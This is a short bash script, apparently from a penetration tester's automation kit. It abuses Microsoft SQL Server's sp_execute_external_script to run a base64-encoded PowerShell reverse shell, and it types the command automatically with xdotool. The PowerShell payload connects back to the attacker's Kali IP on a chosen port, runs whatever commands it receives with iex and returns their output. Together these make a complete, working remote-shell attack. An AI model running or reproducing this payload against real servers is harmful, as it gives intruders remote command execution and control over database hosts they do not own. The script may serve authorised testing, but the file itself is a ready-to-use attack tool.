#!/bin/bash

: '
execute sp_execute_external_script powershell reverse shell
'

source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh
source ~/Desktop/base/code/xdotool/helpers/generate_gui_form.sh
source ~/Desktop/base/code/xdotool/helpers/get_kali_ip.sh

# Generate gui form
generate_form "PORT"

PORT=${form_data["PORT"]}
REV_SHELL=$(echo "\$client = New-Object System.Net.Sockets.TCPClient(\"${KALI_IP}\",${PORT});\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + \"PS \" + (pwd).Path + \"> \";\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()" | base64 -w 0)

paste_command "EXEC sp_execute_external_script @language =N'Python', @script = N'import os; os.system(\"powershell -e ${REV_SHELL}\");';"
xdotool key Return